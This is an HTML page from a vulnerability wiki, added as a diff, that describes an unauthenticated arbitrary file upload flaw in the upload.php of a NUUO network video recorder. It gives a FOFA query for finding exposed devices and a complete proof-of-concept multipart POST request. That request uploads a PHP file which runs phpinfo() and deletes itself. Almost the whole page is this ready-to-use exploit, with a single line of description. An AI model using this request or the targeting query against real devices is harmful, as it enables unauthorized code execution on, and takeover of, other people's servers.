@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NUUO/NUUO%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BAupload.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>NUUO网络视频录像机upload.php任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "NUUO\u7f51\u7edc\u89c6\u9891\u5f55\u50cf\u673aupload.php\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Nacos/NacosDerby%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28QVD-2024-26473%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Nacos/NacosDerby%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28QVD-2024-26473%29/" class="btn btn-xs btn-link">
+        Nacos Derby 远程命令执行漏洞(QVD-2024-26473)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../NUUO%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BAcss_parser.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../NUUO%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BAcss_parser.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        NUUO网络视频录像机css_parser.php任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="nuuouploadphp">NUUO网络视频录像机upload.php任意文件上传漏洞<a class="headerlink" href="#nuuouploadphp" title="Permanent link">&para;</a></h1>
+<p>NUUO网络视频录像机upload.php任意文件上传漏洞，未经身份验证攻击者可通过该漏洞上传恶意文件，造成服务器沦陷。</p>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">body</span><span class="o">=</span><span class="s2">&quot;www.nuuo.com/eHelpdesk.php&quot;</span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">upload</span><span class="p">.</span><span class="nx">php</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span>
+<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="o">:</span><span class="w"> </span><span class="nx">max</span><span class="o">-</span><span class="nx">age</span><span class="o">=</span><span class="mf">0</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="nx">Win64</span><span class="p">;</span><span class="w"> </span><span class="nx">x64</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome</span><span class="o">/</span><span class="mf">127.0.6533.100</span><span class="w"> </span><span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">avif</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+<span class="cm">Accept-Encoding: gzip, deflate, br</span>
+<span class="cm">Connection: keep-alive</span>
+<span class="cm">Content-Type: multipart/form-data; boundary=--------ok4o88lom</span>
+<span class="cm">accept: */</span><span class="o">*</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">155</span>
+
+<span class="o">----------</span><span class="nx">ok4o88lom</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Disposition</span><span class="o">:</span><span class="w"> </span><span class="nx">form</span><span class="o">-</span><span class="nx">data</span><span class="p">;</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">&quot;userfile&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">filename</span><span class="o">=</span><span class="s2">&quot;test.php&quot;</span>
+
+<span class="o">&lt;?</span><span class="nx">php</span><span class="w"> </span><span class="nx">phpinfo</span><span class="p">();</span><span class="err">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nx">__FILE__</span><span class="p">);</span><span class="o">?&gt;</span>
+<span class="o">----------</span><span class="nx">ok4o88lom</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="5c2e597f5b4233b5e694d71104f622e9" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251439472.jpg" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Nacos/NacosDerby%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28QVD-2024-26473%29/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Nacos/NacosDerby%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28QVD-2024-26473%29/" class="btn btn-xs btn-link">
+        Nacos Derby 远程命令执行漏洞(QVD-2024-26473)
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../NUUO%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BAcss_parser.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../NUUO%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BAcss_parser.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        NUUO网络视频录像机css_parser.php任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
